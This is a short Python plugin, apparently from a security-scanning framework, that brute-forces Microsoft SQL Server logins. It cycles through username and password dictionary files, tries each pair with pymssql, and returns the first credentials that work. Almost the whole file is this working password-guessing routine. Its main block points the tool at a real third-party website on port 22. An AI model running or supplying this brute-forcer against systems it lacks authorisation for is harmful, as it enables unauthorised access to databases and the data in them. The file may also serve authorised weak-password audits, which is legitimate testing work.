#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import pymssql
import socket

def info(data=None):
    info = {
        "name": "weakpass",
        "info": "weakpass",
        "level": "high",
        "type": "weakpass",
    }
    return info

def prove(data):
    data = init(data, 'sqlserver')
    if _socket_connect(data['target_host'], data['target_port']):
        usernamedic = _read_dic(data['d1']) if 'd1' in data.keys() else  _read_dic('dict/sqlserver_usernames.txt')
        passworddic = _read_dic(data['d2']) if 'd2' in data.keys() else  _read_dic('dict/sqlserver_passwords.txt')
        for linef1 in usernamedic:
            username = linef1.strip('\r').strip('\n')
            for linef2 in passworddic:
                password = (
                    linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                    '\r').strip('\n')
                try:
                    db = pymssql.connect(server=data['target_host'], port=data['target_port'], user=username, password=password,charset="UTF-8")
                    data['flag'] = 1
                    data['data'].append({"username":username, "password": password})
                    data['res'].append({"info": username + "/" + password, "key": 'sqlserver'})
                    return data
                except:
                    pass
    return data


# def exec(data=None):
#     data = {}
#     data['data'] = 'This is a test.'
#     import time
#     import random
#     if random.randint(1, 10) > 10:
#         data['flag'] = True
#     else:
#         data['flag'] = False
#     return data

def _read_dic(dicname):
    with open(dicname, 'r') as f:
        return f.readlines()

def _socket_connect(ip, port,msg = "test"):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        s.sendall(bytes(msg, 'utf-8'))
        # message = str(s.recv(1024))
        s.close()
        return True
    except:
        return False

if __name__=='__main__':
    from script import init, curl
    print(prove({'target_host':'www.baidu.com','target_port': 22,'flag':-1,'data':[],'res':[]}))